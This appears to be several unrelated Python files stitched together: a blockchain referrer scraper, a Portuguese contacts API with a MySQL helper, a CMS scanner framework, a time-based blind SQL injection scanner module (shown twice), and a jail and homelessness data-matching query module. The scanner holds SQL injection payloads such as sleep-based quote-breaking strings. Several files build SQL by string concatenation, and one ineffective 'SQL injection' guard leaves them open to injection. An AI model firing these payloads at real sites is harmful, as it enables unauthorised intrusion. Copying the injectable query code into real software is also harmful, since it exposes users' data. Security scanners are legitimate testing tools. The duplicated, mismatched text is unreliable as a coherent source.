#cur.execute(query)                    
#con.commit()

query = "SELECT rid FROM referrers ORDER BY rid DESC LIMIT 1"
cur.execute(query)                    
in_database = cur.fetchone() or [0]

ws.send('{"id":1, "method":"call", "params":[0,"get_account_count",[]]}')
result = ws.recv()
j = json.loads(result)
account_count = int(j["result"])

print account_count

for ac in range(in_database[0], account_count):

    ws.send('{"id":1, "method":"call", "params":[0,"get_objects",[["1.2.' + str(ac) + '"]]]}')
    result = ws.recv()
    j = json.loads(result)

    try:
        account_id = j["result"][0]["id"]
        account_name = j["result"][0]["name"]

        referrer = j["result"][0]["referrer"]
        referrer_rewards_percentage = j["result"][0]["referrer_rewards_percentage"]
        lifetime_referrer = j["result"][0]["lifetime_referrer"]
        lifetime_referrer_fee_percentage = j["result"][0]["lifetime_referrer_fee_percentage"]

        print account_id
        print referrer
        print lifetime_referrer
        print ""

        query = "INSERT INTO referrers (account_id, account_name, referrer, referrer_rewards_percentage, lifetime_referrer, lifetime_referrer_fee_percentage) " \
                "VALUES('"+account_id+"', '"+account_name+"','"+referrer+"', '"+str(referrer_rewards_percentage)+"','"+lifetime_referrer+"', '"+str(lifetime_referrer_fee_percentage)+"')"                    
        cur.execute(query)                    
        con.commit()

    except:
        continue

con.close()


""" Api Controller

    Arquivo onde se encontra toda a l√≥gica que rodar√° na rota '/api'

Todo:

    None

"""

import cgi
import json
import src.models.mysql as mysql

def getFields(environ):
        """
        getFields function:
            retorna os campos que chegam pelos m√©todos POST DELETE PUT
        """
        data_env = environ.copy()
        data_env['QUERY_STRING'] = ''
        data = cgi.FieldStorage(
            fp=environ['wsgi.input'],
            environ=data_env,
            keep_blank_values=True
        )
        return data

def api(environ, start_response):
    """
        api function:
            L√≥gica para a rota api
    """
    
    # M√©todo POST, adiciona um contato no banco
    if environ['REQUEST_METHOD'] == 'POST':
        try:
            post = getFields(environ)
            db = mysql.MySQL()
            db.insert('users', {"nome":post['nome'].value, "sobrenome":post['sobrenome'].value, "endereco":post['endereco'].value })                    
            start_response('200 OK', [('Content-Type', 'text/json')])
            return [str.encode(json.dumps({"success":"true"}))]
        except Exception as e:
            start_response('500 ERROR', [('Content-Type', 'text/json')])
            return [str.encode(json.dumps({"success":"false","error": 500,"method": "POST", "msg": "N√£o foi poss√≠vel adicionar contato"}))]

    # M√©todo DELETE, deleta um contato do banco
    if environ['REQUEST_METHOD'] == 'DELETE':
        try:
            delete = getFields(environ)
            db = mysql.MySQL()
            db.delete_where('users', 'id = {}'.format(delete['id'].value))                    
            start_response('200 OK', [('Content-Type', 'text/json')])
            return [str.encode(json.dumps({"success":"true"}))]
        except Exception as e:
            start_response('500 ERROR', [('Content-Type', 'text/json')])
            return [str.encode(json.dumps({"success":"false","error": 500,"method": "DELETE", "msg": "N√£o foi poss√≠vel deletar contato"}))]                    
        
    # M√©todo PUT, atualiza um contato 
    if environ['REQUEST_METHOD'] == 'PUT':
        try:
            put = getFields(environ)
            db = mysql.MySQL()
            db.update_where('users',"nome = '"+ put['nome'].value +"', sobrenome = '"+ put['sobrenome'].value +"', endereco = '"+ put['endereco'].value + "'", 'id = ' + put['id'].value)                    
            start_response('200 OK', [('Content-Type', 'text/json')])
            return [str.encode(json.dumps({"success":"true"}))]
        except Exception as e:
            start_response('500 ERROR', [('Content-Type', 'text/json')])
            return [str.encode(json.dumps({"success":"false","error": 500,"method": "PUT", "msg": "N√£o foi poss√≠vel atualizar contato"}))]

    # M√©todo GET, retorna todos os contatos no banco
    if environ['REQUEST_METHOD'] == 'GET':
        try:
            db = mysql.MySQL()
            json_data = db.select('users')                    
            html = str.encode(json.dumps(json_data))
            start_response('200 OK', [('Content-Type', 'text/json')])
            return [html]
        except Exception as e:
            start_response('500 ERROR', [('Content-Type', 'text/json')])
            return [str.encode(json.dumps({"success":"false","error": 500,"method": "GET", "msg": "N√£o foi poss√≠vel retornar tabela"}))]                    

""" mysql File

    Arquivo onde se encontra todas as fun√ß√µes para trabalhar com o db
Todo:

    None

"""

import json
import mysql.connector as mysql
import src.settings as conf

class MySQL():
	"""
        MySQL class:
           	Todas as fun√ß√µes para manipula√ß√£o do DB
    """
	def __init__(self):
		self.__connection = mysql.connect(**conf.DATABASE)
		self.cursor = self.__connection.cursor()

	def execute(self, query):
		"""
        	execute function:
           		Executa a query com tratamento de error
    	"""
		try:
			self.cursor.execute(query)
		except mysql.Error as error:
			print("Error: {}".format(error))
		return self.cursor

	def select(self, table):                    
		"""
        	select function:
           		Retorna todos os dados da tabela em formato JSON
    	"""
		aux_dict = dict()
		self.cursor.execute("SELECT * FROM {0}".format( table))                    
		json_data = {}
		for user in self.cursor:
			json_data[str(user[3])] = {}
			json_data[str(user[3])]['nome'] = user[0]
			json_data[str(user[3])]['sobrenome'] = user[1]
			json_data[str(user[3])]['endereco'] = user[2]
		return json.dumps(json_data)

	def insert(self, table, content):                    
		"""
        	insert function:
           		Recebe em JSON os dados e grava na tabela
    	"""
		nome = content["nome"]
		sobrenome = content["sobrenome"]
		endereco = content["endereco"]
		add_user = """INSERT INTO users (nome, sobrenome, endereco) VALUES (%s,%s,%s)"""

		data_user = (nome, sobrenome, endereco)                    
		try:
		    self.cursor.execute(add_user,data_user)
		except mysql.Error as error:
		    print("Error: {}".format(error))
		self.__connection.commit()
		self.cursor.lastrowid

	def delete_where(self, table, where):                    
		"""
        	delete_where function:
           		Deleta um campo especifico da tabela
    	"""
		try:
		    self.cursor.execute("DELETE FROM {0} WHERE {1}".format(table, where))                    
		except mysql.Error as error:
		    print("Erro: {}".format(error))
		self.__connection.commit()
		return self.cursor


	def update_where(self, table, info, where):                    
		"""
        	update_where function:
           		Atualiza um campo espec√≠fico da tabela
    	"""
		try:
		    self.cursor.execute("UPDATE {0} SET {1} WHERE {2}".format(table, info, where))                    
		except mysql.Error as error:
		    print("Erro: {}".format(error))
		self.__connection.commit()
		return self.cursor

	def close(self):
		"""
        	close function:
           		fecha a conexao com o banco
    	"""
		self.__connection.close()



import os
import logging
import sys
from detector import CMSDetector

class CustomModuleLoader:
    folder = ""
    blacklist = ['cms_scanner.py', '__init__.py']
    modules = []
    logger = None
    is_aggressive = False
    module = None

    def __init__(self, folder='scanners', blacklist=[], is_aggressive=False, log_level=logging.INFO):
        self.blacklist.extend(blacklist)
        self.folder = os.path.join(os.path.dirname(__file__), folder)
        self.logger = logging.getLogger("CMS Scanner")
        self.logger.setLevel(log_level)
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(log_level)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        ch.setFormatter(formatter)
        self.logger.addHandler(ch)
        self.logger.debug("Loading CMS scripts")
        self.is_aggressive = is_aggressive

    def load(self, script, name):
        sys.path.insert(0, os.path.dirname(__file__))
        base = script.replace('.py', '')
        try:
            command_module = __import__("scanners.%s" % base, fromlist=["scanners"])
            module = command_module.Scanner()
            if module.name == name:
                self.module = module
                self.module.set_logger(self.logger.getEffectiveLevel())
                self.logger.debug("Selected %s for target" % name)
        except ImportError as e:
            self.logger.warning("Error importing script:%s %s" % (base, str(e)))
        except Exception as e:
            self.logger.warning("Error loading script:%s %s" % (base, str(e)))

    def load_modules(self, name):
        for f in os.listdir(self.folder):
            if not f.endswith('.py'):
                continue
            if f in self.blacklist:
                continue
            self.load(f, name)

    def run_scripts(self, base, headers={}, cookies={}):
        p = CMSDetector()
        cms = p.scan(base)
        if cms:
            self.logger.debug("Detected %s as active CMS" % cms)
            self.load_modules(cms)
            if self.module:
                results = self.module.run(base)
                return {cms: results}
            else:
                self.logger.warning("No script was found for CMS %s" % cms)
        else:
            self.logger.info("No cms was detected on target %s" % base)                    
        return None


import time
import requests
import os
import logging
import sys

class Scanner:
    # set frequency for update call
    update_frequency = 0
    name = ""
    aggressive = False
    last_update = 0
    cache_dir = os.path.join(os.path.dirname(__file__), 'cache')
    logger = None
    updates = {}
    headers = {}                    
    cookies = {}

    def get_version(self, url):
        return None

    def set_logger(self, log_level=logging.DEBUG):
        self.logger = logging.getLogger("CMS-%s" % self.name)
        self.logger.setLevel(log_level)
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(log_level)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        ch.setFormatter(formatter)
        if not self.logger.handlers:
            self.logger.addHandler(ch)

    def update(self):
        pass
    
    def run(self, url):
        return {}

    def get_update_cache(self):
        if os.path.exists(self.cache_file('updates.txt')):
            self.logger.debug("Reading update cache")
            with open(self.cache_file('updates.txt'), 'r') as f:
                for x in f.read().strip().split('\n'):
                    if len(x):
                        scanner, last_update = x.split(':')
                        self.updates[scanner] = int(last_update)
                    else:
                        self.logger.warning("There appears to be an error in the updates cache file")
                        self.updates[self.name] = 0
            if self.name in self.updates:
                self.last_update = self.updates[self.name]
            else:
                self.updates[self.name] = time.time()
        else:
            self.logger.debug("No updates cache file found, creating empty one")
            self.updates[self.name] = time.time()

    def set_update_cache(self):
        self.logger.debug("Updating updates cache file")
        with open(self.cache_file('updates.txt'), 'w') as f:
            for x in self.updates:
                f.write("%s:%d\n" % (x, self.updates[x]))

    def cache_file(self, r):
        return os.path.join(self.cache_dir, r)

    def setup(self):
        if not os.path.exists(self.cache_dir):
            self.logger.info("Creating cache directory")
            os.mkdir(self.cache_dir)
        self.get_update_cache()
        if self.last_update + self.update_frequency < time.time():
            self.last_update = time.time()
            self.updates[self.name] = time.time()
            self.update()
            self.set_update_cache()
        else:
            self.logger.debug("Database is up to date, skipping..")

    def get(self, url):                    
        result = requests.get(url, allow_redirects=False, headers=self.headers, cookies=self.cookies)                    
        return result                    


import module_base
try:
    from urllib import quote_plus
except ImportError:
    from urllib.parse import quote_plus
import requests
import time
import random
class Module(module_base.Base):
    def __init__(self):
        self.name = "Blind SQL Injection"                    
        self.active = True
        self.module_types = ['injection', 'dangerous']
        self.possibilities = [
            '\' or sleep({sleep_value})--',
            '\' or sleep({sleep_value})\\*',
            '-1 or sleep({sleep_value})--',
            '-1 or sleep({sleep_value})\\*',
            'aaaaa\' or sleep({sleep_value}) or \'a\'=\''
        ]
        self.has_read_timeout = False
        self.timeout_state = 0
        self.max_timeout_state = 6  # 60 secs
        self.auto = True
        self.headers = {}
        self.cookies = {}
        self.input = "urldata"
        self.output = "vulns"

    def run(self, url, data={}, headers={}, cookies={}):
        if not self.active and 'passive' not in self.module_types:
            # cannot send requests and not configured to do passive analysis on data
            return
        base, param_data = self.get_params_from_url(url)
        self.cookies = cookies
        self.headers = headers
        results = []
        if not data:
            data = {}
        for param in param_data:
            result = self.inject(base, param_data, data, parameter_get=param, parameter_post=None)
            if result:
                results.append([url, data, 'GET', param])

        for param in data:
            result = self.inject(base, param_data, data, parameter_get=None, parameter_post=param)
            if result:
                results.append([url, data, 'POST', param])
        return results

    def send(self, url, params, data):
        result = None
        headers = self.headers
        cookies = self.cookies
        start = time.time()
        # print(url, params, data)
        try:
            if data:
                result = requests.post(url, params=params, data=data, headers=headers, cookies=cookies)
            else:
                result = requests.get(url, params=params, headers=headers, cookies=cookies)
        except requests.Timeout:
            if self.has_read_timeout:
                if self.timeout_state > self.max_timeout_state:
                    r = raw_input('The site appears to be dead, press enter to try again, q to quit') if not self.auto else "q"
                    if r.strip() == "q":
                        self.close()
                        return None
                    else:
                        return self.send(url, params, data, headers, cookies)
                self.timeout_state += 1
                sleeptime = self.timeout_state * 10
                time.sleep(sleeptime)
                return self.send(url, params, data, headers, cookies)
            else:
                self.has_read_timeout = True
                self.timeout_state = 1
                sleeptime = self.timeout_state * 10
                time.sleep(sleeptime)
                return self.send(url, params, data, headers, cookies)
        except Exception:
            return False
        end = time.time()
        eslaped = end - start
        return eslaped, result

    def validate(self, url, params, data, injection_value, original_value, parameter_post=None, parameter_get=None):
        min_wait_time = random.randint(5, 10)
        injection_true = injection_value.replace('{sleep_value}', str(min_wait_time))
        injection_true = injection_true.replace('{original_value}', str(original_value))

        injection_false = injection_value.replace('{sleep_value}', str(0))
        injection_false = injection_false.replace('{original_value}', str(original_value))

        if parameter_get:
            tmp = dict(params)
            tmp[parameter_get] = injection_true
            result = self.send(url, params, tmp)
            if result:
                eslaped, object = result
                if eslaped > min_wait_time:
                    tmp = dict(params)
                    tmp[parameter_get] = injection_false
                    result = self.send(url, tmp, data)
                    if result:
                        eslaped, object = result
                        if eslaped < min_wait_time:
                            return True
                        else:
                            return False
                else:
                    return False
        else:
            postenc = self.params_to_url("", data)[1:]
            tmp = dict(data)
            tmp[parameter_post] = injection_true
            result = self.send(url, params, tmp)
            if result:
                eslaped, object = result
                if eslaped > min_wait_time:
                    tmp = dict(params)
                    tmp[parameter_post] = injection_false
                    result = self.send(url, params, tmp)
                    if result:
                        eslaped, object = result
                        if eslaped < min_wait_time:
                            return True
                    else:
                        return False
                else:
                    return False

    def inject(self, url, params, data=None, parameter_get=None, parameter_post=None):
        if parameter_get:
            tmp = dict(params)
            for injection_value in self.possibilities:
                min_wait_time = random.randint(5, 10)
                payload = injection_value.replace('{sleep_value}', str(min_wait_time))
                payload = payload.replace('{original_value}', str(params[parameter_get]))
                tmp[parameter_get] = payload
                result = self.send(url, tmp, data)
                if result:
                    eslaped, object = result
                    if eslaped > min_wait_time:
                        if self.validate(url, params, data, injection_value, original_value=params[parameter_get], parameter_post=None,
                                      parameter_get=parameter_get):
                            return True
            return False
        if parameter_post:
            tmp = dict(data)
            for injection_value in self.possibilities:
                min_wait_time = random.randint(5, 10)
                payload = injection_value.replace('{sleep_value}', str(min_wait_time))
                payload = payload.replace('{original_value}', str(data[parameter_post]))
                tmp[parameter_post] = payload
                result = self.send(url, params, tmp)
                if result:
                    eslaped, object = result
                    if eslaped > min_wait_time:
                        if self.validate(url, params, data, injection_value, original_value=data[parameter_post], parameter_post=parameter_post,
                                      parameter_get=None):
                            return True
            return False




import os
import logging
import sys
from detector import CMSDetector

class CustomModuleLoader:
    folder = ""
    blacklist = ['cms_scanner.py', '__init__.py']
    modules = []
    logger = None
    is_aggressive = False
    module = None

    def __init__(self, folder='scanners', blacklist=[], is_aggressive=False, log_level=logging.INFO):
        self.blacklist.extend(blacklist)
        self.folder = os.path.join(os.path.dirname(__file__), folder)
        self.logger = logging.getLogger("CMS Scanner")
        self.logger.setLevel(log_level)
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(log_level)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        ch.setFormatter(formatter)
        self.logger.addHandler(ch)
        self.logger.debug("Loading CMS scripts")
        self.is_aggressive = is_aggressive

    def load(self, script, name):
        sys.path.insert(0, os.path.dirname(__file__))
        base = script.replace('.py', '')
        try:
            command_module = __import__("scanners.%s" % base, fromlist=["scanners"])
            module = command_module.Scanner()
            if module.name == name:
                self.module = module
                self.module.set_logger(self.logger.getEffectiveLevel())
                self.logger.debug("Selected %s for target" % name)
        except ImportError as e:
            self.logger.warning("Error importing script:%s %s" % (base, str(e)))
        except Exception as e:
            self.logger.warning("Error loading script:%s %s" % (base, str(e)))

    def load_modules(self, name):
        for f in os.listdir(self.folder):
            if not f.endswith('.py'):
                continue
            if f in self.blacklist:
                continue
            self.load(f, name)

    def run_scripts(self, base, headers={}, cookies={}):
        p = CMSDetector()
        cms = p.scan(base)
        if cms:
            self.logger.debug("Detected %s as active CMS" % cms)
            self.load_modules(cms)
            if self.module:
                results = self.module.run(base)
                return {cms: results}
            else:
                self.logger.warning("No script was found for CMS %s" % cms)
        else:
            self.logger.info("No cms was detected on target %s" % base)                    
        return None


import time
import requests
import os
import logging
import sys

class Scanner:
    # set frequency for update call
    update_frequency = 0
    name = ""
    aggressive = False
    last_update = 0
    cache_dir = os.path.join(os.path.dirname(__file__), 'cache')
    logger = None
    updates = {}
    headers = {}                    
    cookies = {}

    def get_version(self, url):
        return None

    def set_logger(self, log_level=logging.DEBUG):
        self.logger = logging.getLogger("CMS-%s" % self.name)
        self.logger.setLevel(log_level)
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(log_level)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        ch.setFormatter(formatter)
        if not self.logger.handlers:
            self.logger.addHandler(ch)

    def update(self):
        pass
    
    def run(self, url):
        return {}

    def get_update_cache(self):
        if os.path.exists(self.cache_file('updates.txt')):
            self.logger.debug("Reading update cache")
            with open(self.cache_file('updates.txt'), 'r') as f:
                for x in f.read().strip().split('\n'):
                    if len(x):
                        scanner, last_update = x.split(':')
                        self.updates[scanner] = int(last_update)
                    else:
                        self.logger.warning("There appears to be an error in the updates cache file")
                        self.updates[self.name] = 0
            if self.name in self.updates:
                self.last_update = self.updates[self.name]
            else:
                self.updates[self.name] = time.time()
        else:
            self.logger.debug("No updates cache file found, creating empty one")
            self.updates[self.name] = time.time()

    def set_update_cache(self):
        self.logger.debug("Updating updates cache file")
        with open(self.cache_file('updates.txt'), 'w') as f:
            for x in self.updates:
                f.write("%s:%d\n" % (x, self.updates[x]))

    def cache_file(self, r):
        return os.path.join(self.cache_dir, r)

    def setup(self):
        if not os.path.exists(self.cache_dir):
            self.logger.info("Creating cache directory")
            os.mkdir(self.cache_dir)
        self.get_update_cache()
        if self.last_update + self.update_frequency < time.time():
            self.last_update = time.time()
            self.updates[self.name] = time.time()
            self.update()
            self.set_update_cache()
        else:
            self.logger.debug("Database is up to date, skipping..")

    def get(self, url):                    
        result = requests.get(url, allow_redirects=False, headers=self.headers, cookies=self.cookies)                    
        return result                    


import module_base
try:
    from urllib import quote_plus
except ImportError:
    from urllib.parse import quote_plus
import requests
import time
import random
class Module(module_base.Base):
    def __init__(self):
        self.name = "Blind SQL Injection"                    
        self.active = True
        self.module_types = ['injection', 'dangerous']
        self.possibilities = [
            '\' or sleep({sleep_value})--',
            '\' or sleep({sleep_value})\\*',
            '-1 or sleep({sleep_value})--',
            '-1 or sleep({sleep_value})\\*',
            'aaaaa\' or sleep({sleep_value}) or \'a\'=\''
        ]
        self.has_read_timeout = False
        self.timeout_state = 0
        self.max_timeout_state = 6  # 60 secs
        self.auto = True
        self.headers = {}
        self.cookies = {}
        self.input = "urldata"
        self.output = "vulns"

    def run(self, url, data={}, headers={}, cookies={}):
        if not self.active and 'passive' not in self.module_types:
            # cannot send requests and not configured to do passive analysis on data
            return
        base, param_data = self.get_params_from_url(url)
        self.cookies = cookies
        self.headers = headers
        results = []
        if not data:
            data = {}
        for param in param_data:
            result = self.inject(base, param_data, data, parameter_get=param, parameter_post=None)
            if result:
                results.append([url, data, 'GET', param])

        for param in data:
            result = self.inject(base, param_data, data, parameter_get=None, parameter_post=param)
            if result:
                results.append([url, data, 'POST', param])
        return results

    def send(self, url, params, data):
        result = None
        headers = self.headers
        cookies = self.cookies
        start = time.time()
        # print(url, params, data)
        try:
            if data:
                result = requests.post(url, params=params, data=data, headers=headers, cookies=cookies)
            else:
                result = requests.get(url, params=params, headers=headers, cookies=cookies)
        except requests.Timeout:
            if self.has_read_timeout:
                if self.timeout_state > self.max_timeout_state:
                    r = raw_input('The site appears to be dead, press enter to try again, q to quit') if not self.auto else "q"
                    if r.strip() == "q":
                        self.close()
                        return None
                    else:
                        return self.send(url, params, data, headers, cookies)
                self.timeout_state += 1
                sleeptime = self.timeout_state * 10
                time.sleep(sleeptime)
                return self.send(url, params, data, headers, cookies)
            else:
                self.has_read_timeout = True
                self.timeout_state = 1
                sleeptime = self.timeout_state * 10
                time.sleep(sleeptime)
                return self.send(url, params, data, headers, cookies)
        except Exception:
            return False
        end = time.time()
        eslaped = end - start
        return eslaped, result

    def validate(self, url, params, data, injection_value, original_value, parameter_post=None, parameter_get=None):
        min_wait_time = random.randint(5, 10)
        injection_true = injection_value.replace('{sleep_value}', str(min_wait_time))
        injection_true = injection_true.replace('{original_value}', str(original_value))

        injection_false = injection_value.replace('{sleep_value}', str(0))
        injection_false = injection_false.replace('{original_value}', str(original_value))

        if parameter_get:
            tmp = dict(params)
            tmp[parameter_get] = injection_true
            result = self.send(url, params, tmp)
            if result:
                eslaped, object = result
                if eslaped > min_wait_time:
                    tmp = dict(params)
                    tmp[parameter_get] = injection_false
                    result = self.send(url, tmp, data)
                    if result:
                        eslaped, object = result
                        if eslaped < min_wait_time:
                            return True
                        else:
                            return False
                else:
                    return False
        else:
            postenc = self.params_to_url("", data)[1:]
            tmp = dict(data)
            tmp[parameter_post] = injection_true
            result = self.send(url, params, tmp)
            if result:
                eslaped, object = result
                if eslaped > min_wait_time:
                    tmp = dict(params)
                    tmp[parameter_post] = injection_false
                    result = self.send(url, params, tmp)
                    if result:
                        eslaped, object = result
                        if eslaped < min_wait_time:
                            return True
                    else:
                        return False
                else:
                    return False

    def inject(self, url, params, data=None, parameter_get=None, parameter_post=None):
        if parameter_get:
            tmp = dict(params)
            for injection_value in self.possibilities:
                min_wait_time = random.randint(5, 10)
                payload = injection_value.replace('{sleep_value}', str(min_wait_time))
                payload = payload.replace('{original_value}', str(params[parameter_get]))
                tmp[parameter_get] = payload
                result = self.send(url, tmp, data)
                if result:
                    eslaped, object = result
                    if eslaped > min_wait_time:
                        if self.validate(url, params, data, injection_value, original_value=params[parameter_get], parameter_post=None,
                                      parameter_get=parameter_get):
                            return True
            return False
        if parameter_post:
            tmp = dict(data)
            for injection_value in self.possibilities:
                min_wait_time = random.randint(5, 10)
                payload = injection_value.replace('{sleep_value}', str(min_wait_time))
                payload = payload.replace('{original_value}', str(data[parameter_post]))
                tmp[parameter_post] = payload
                result = self.send(url, params, tmp)
                if result:
                    eslaped, object = result
                    if eslaped > min_wait_time:
                        if self.validate(url, params, data, injection_value, original_value=data[parameter_post], parameter_post=parameter_post,
                                      parameter_get=None):
                            return True
            return False




import logging
import pandas as pd
from webapp import db, app
from webapp.utils import generate_matched_table_name, table_exists
from collections import OrderedDict
from webapp.logger import logger
import numpy as np


def get_histogram_bar_chart_data(data, distribution_function, shared_ids, data_name):
    intersection_data = data[data.matched_id.isin(shared_ids)]
    distribution, groups = distribution_function(data)
    distribution_intersection, _ = distribution_function(intersection_data, groups)
    bins = []
    logger.info(data_name)
    #logger.info(distribution)
    logger.info(distribution_intersection)
    logger.info(len(data.matched_id.unique()))
    for bin_index in range(len(distribution)):
        try:
            of_status = {
                "x": data_name,
                "y": int(distribution.iloc[bin_index])/len(data.matched_id.unique())*100
            }
        except ZeroDivisionError:
            of_status = {
                "x": data_name,
                "y": 0
            }
        try:
            all_status = {
                "x": "Jail & Homeless",
                "y": int(distribution_intersection.iloc[bin_index])/len(intersection_data.matched_id.unique())*100
            }
        except:
            all_status = {
                "x": "Jail & Homeless",
                "y": 0
            }
        bins.append((of_status, all_status))
    return [bins, list(distribution.index)]


def window(iterable, size=2):
    i = iter(iterable)
    win = []
    for e in range(0, size):
        win.append(next(i))
    yield win
    for e in i:
        win = win[1:] + [e]
        yield win


def get_contact_dist(data, bins=None):
    data = data.groupby('matched_id').matched_id.count().as_matrix()
    data = data.astype(int)
    one_contact = list(data).count(1)
    rest = np.delete(data, np.argwhere(data==1))
    if one_contact == len(data):
        df_hist = pd.DataFrame({'contacts': [one_contact]}, index=['1 contact'])
        logger.info("all ones!")
        return df_hist, 1

    if bins is not None:
        num, groups = np.histogram(rest, bins)
    else:
        num, groups = np.histogram(rest, 'auto')
        if len(groups) > 4:
            bins = 4
            num, groups = np.histogram(rest, bins)
    hist = [one_contact] + list(num)
    index = [pd.Interval(1, 2, 'left')] + [pd.Interval(int(b[0]), int(b[1])+1, 'left') for b in list(window(list(groups), 2))]
    df_hist = pd.DataFrame({'contacts': hist}, index=contacts_interval_to_text(index))
    logger.info(num)
    logger.info(groups)
    logger.info(index)
    logger.info(df_hist)
    return df_hist, groups


def get_days_distribution(data, groups=None):
    dist = pd.cut(
            data.groupby('matched_id').days.sum(),
            [0, 1, 2, 10, 90, 1000],
            right=False
        ).value_counts(sort=False)
    dist = pd.DataFrame({'days': dist.as_matrix()}, index=days_interval_to_text(dist.index))
    return dist, []


def contacts_interval_to_text(interval_list):
    result = ['1 contact']
    for c, i in enumerate(interval_list[1:], 1):
        if c == 1:
            if i.right == 3:
                result.append(f"2 contacts")
            else:
                result.append(f"{i.left}-{i.right - 1 if i.open_right else i.right} contacts")
        else:
            if i.left + 1 == i.right - 1:
                result.append(f"{i.left + 1} contacts")
            else:
                result.append(f"{i.left + 1}-{i.right - 1 if i.open_right else i.right} contacts")
    return result


def days_interval_to_text(interval_list):
    result = ['< 1 day', '1 day']
    for i in interval_list[2:-1]:
        result.append(f"{i.left}-{i.right - 1 if i.open_right else i.right} days")

    result = result + ['90+ days']
    return result


def get_records_by_time(
    start_time,
    end_time,
    jurisdiction,
    limit,
    offset,
    order_column,
    order,
    set_status
):
    matched_hmis_table = generate_matched_table_name(jurisdiction, 'hmis_service_stays')
    matched_bookings_table = generate_matched_table_name(jurisdiction, 'jail_bookings')
    hmis_exists = table_exists(matched_hmis_table, db.engine)
    bookings_exists = table_exists(matched_bookings_table, db.engine)
    if not hmis_exists:
        raise ValueError('HMIS matched table {} does not exist. Please try again later.'.format(matched_hmis_table))
    if not bookings_exists:
        raise ValueError('Bookings matched table {} does not exist. Please try again later.'.format(matched_bookings_table))
    columns = [
        ("matched_id", 'matched_id'),                    
        ("coalesce(hmis_summary.first_name, jail_summary.first_name)", 'first_name'),
        ("coalesce(hmis_summary.last_name, jail_summary.last_name)", 'last_name'),
        ("hmis_summary.hmis_id", 'hmis_id'),
        ("hmis_summary.hmis_contact", 'hmis_contact'),
        ("hmis_summary.last_hmis_contact", 'last_hmis_contact'),
        ("hmis_summary.cumu_hmis_days", 'cumu_hmis_days'),
        ("jail_summary.jail_id", 'jail_id'),
        ("jail_summary.jail_contact", 'jail_contact'),
        ("jail_summary.last_jail_contact", 'last_jail_contact'),
        ("jail_summary.cumu_jail_days", 'cumu_jail_days'),
        ("coalesce(hmis_summary.hmis_contact, 0) + coalesce(jail_summary.jail_contact, 0)", 'total_contact'),
    ]
    if not any(order_column for expression, alias in columns):                    
        raise ValueError('Given order column expression does not match any alias in query. Exiting to avoid SQL injection attacks')
    base_query = """WITH hmis_summary AS (
        SELECT
            matched_id,
            string_agg(distinct internal_person_id::text, ',') as hmis_id,
            sum(
                case when client_location_end_date is not null 
                    then date_part('day', client_location_end_date::timestamp - client_location_start_date::timestamp) \
                    else date_part('day', updated_ts::timestamp - client_location_start_date::timestamp) 
                end
            )::int as cumu_hmis_days,
            count(*) AS hmis_contact,
            to_char(max(client_location_start_date::timestamp), 'YYYY-MM-DD') as last_hmis_contact,
            max(first_name) as first_name,
            max(last_name) as last_name
        FROM (
            SELECT
               *
            FROM {hmis_table}
            WHERE
                not (client_location_start_date < %(start_date)s AND client_location_end_date < %(start_date)s) and
                not (client_location_start_date > %(end_date)s AND client_location_end_date > %(end_date)s)
        ) AS hmis
        GROUP BY matched_id
    ), jail_summary AS (
        SELECT
            matched_id,
            string_agg(distinct coalesce(internal_person_id, inmate_number)::text, ',') as jail_id,
            sum(
                case when jail_exit_date is not null 
                    then date_part('day', jail_exit_date::timestamp - jail_entry_date::timestamp) \
                    else date_part('day', updated_ts::timestamp - jail_entry_date::timestamp) 
                end
            )::int as cumu_jail_days,
            count(*) AS jail_contact,
            to_char(max(jail_entry_date::timestamp), 'YYYY-MM-DD') as last_jail_contact,
            max(first_name) as first_name,
            max(last_name) as last_name
        FROM (
            SELECT
               *
            FROM {booking_table}
            WHERE
                not (jail_entry_date < %(start_date)s AND jail_exit_date < %(start_date)s) and
                not (jail_entry_date > %(end_date)s AND jail_exit_date > %(end_date)s)
        ) AS jail
        GROUP BY matched_id
    )
    SELECT
    {columns}
    FROM hmis_summary
    FULL OUTER JOIN jail_summary USING(matched_id)
    """.format(
        hmis_table=matched_hmis_table,
        booking_table=matched_bookings_table,
        columns=",\n".join("{} as {}".format(expression, alias) for expression, alias in columns),
    )


    logging.info('Querying table records')
    if order not in {'asc', 'desc'}:
        raise ValueError('Given order direction is not valid. Exiting to avoid SQL injection attacks')
    if not isinstance(limit, int) and not limit.isdigit() and limit != 'ALL':
        raise ValueError('Given limit is not valid. Existing to avoid SQL injection attacks')
    filter_by_status = {
        'Jail': 'jail_summary.matched_id is not null',
        'HMIS': 'hmis_summary.matched_id is not null',
        'Intersection': 'hmis_summary.matched_id = jail_summary.matched_id'
    }
    status_filter = filter_by_status.get(set_status, 'true')
    rows_to_show = [dict(row) for row in db.engine.execute("""
        {}
        where {}
        order by {} {}
        limit {} offset %(offset)s""".format(
            base_query,
            status_filter,
            order_column,
            order,
            limit
        ),
        start_date=start_time,
        end_date=end_time,
        offset=offset,
    )]
    query = """
    SELECT
    *,
    DATE_PART('day', {exit}::timestamp - {start}::timestamp) as days
    FROM {table_name}
    WHERE
        not ({start} < %(start_time)s AND {exit} < %(start_time)s) and
        not ({start} > %(end_time)s AND {exit} > %(end_time)s)
    """
    hmis_query = query.format(
        table_name=matched_hmis_table,
        start="client_location_start_date",
        exit="client_location_end_date"
    )
    bookings_query = query.format(
        table_name=matched_bookings_table,
        start="jail_entry_date",
        exit="jail_exit_date"
    )
    logging.info('Done querying table records')
    logging.info('Querying venn diagram stats')
    venn_diagram_stats = next(db.engine.execute('''select
        count(distinct(hmis.matched_id)) as hmis_size,
        count(distinct(bookings.matched_id)) as bookings_size,
        count(distinct(case when hmis.matched_id = bookings.matched_id then hmis.matched_id else null end)) as shared_size,
        count(distinct(matched_id))
        from ({}) hmis
        full outer join ({}) bookings using (matched_id)
    '''.format(hmis_query, bookings_query),
                                start_time=start_time,
                                end_time=end_time))
    counts_by_status = {
        'HMIS': venn_diagram_stats[0],
        'Jail': venn_diagram_stats[1],
        'Intersection': venn_diagram_stats[2]
    }

    logging.info('Done querying venn diagram stats')

    venn_diagram_data = [
        {
            "sets": [
                "Jail"
            ],
